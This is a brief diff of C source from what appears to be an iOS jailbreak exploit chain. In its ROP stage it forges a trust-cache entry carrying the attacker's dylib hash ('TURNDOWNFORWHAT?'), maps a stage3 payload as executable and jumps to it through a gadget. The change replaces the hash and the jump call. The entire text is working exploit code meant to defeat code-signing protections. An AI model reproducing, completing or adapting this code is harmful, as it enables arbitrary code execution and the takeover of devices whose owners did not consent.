@@ -802,7 +802,7 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	struct trust_chain * new_entry = malloc(sizeof(struct trust_chain));
 	snprintf((char*)&new_entry->uuid,16,"TURNDOWNFORWHAT?");
 	new_entry->count = 1;
-	hash_t my_dylib_hash = {0xb7,0x4e,0x84,0x1a,0xdb,0x3d,0x7d,0x18,0xdd,0x10,0x62,0xfb,0x9e,0x40,0x99,0x12,0xb1,0xfe,0x94,0x9c};
+	hash_t my_dylib_hash = {0x04,0xc9,0x9b,0x00,0x5e,0xe4,0x40,0x3b,0xf9,0x19,0x5c,0x93,0xb3,0xb3,0xc8,0x36,0x3b,0x38,0x50,0xb1};
 	memcpy(&new_entry->hash[0],my_dylib_hash,20);
 	DEFINE_ROP_VAR("new_trust_chain_entry",sizeof(struct trust_chain),new_entry);
 
@@ -1256,7 +1256,7 @@ _STRUCT_ARM_THREAD_STATE64
 	ROP_VAR_ARG64("dylib_fd",5);
 	CALL("__mmap",offsets->stage3_loadaddr,offsets->stage3_size,PROT_EXEC|PROT_READ,MAP_FIXED|MAP_PRIVATE,0,offsets->stage3_fileoffset,0,0);
 	// jump
-	CALL_FUNC(offsets->stage3_jumpaddr,0xdeadbeef,get_addr_from_name(offsets,"write")-0x180000000+offsets->new_cache_addr,0,0,0,0,0,0);
+	CALL_FUNCTION_NO_SLIDE(offsets->BEAST_GADGET,offsets->stage3_jumpaddr,0xdeadbeef,get_addr_from_name(offsets,"write")-0x180000000+offsets->new_cache_addr,0,0,0,0,0,0);
 
 
 	// TODO: figure out what the hell is wrong with those two threads below
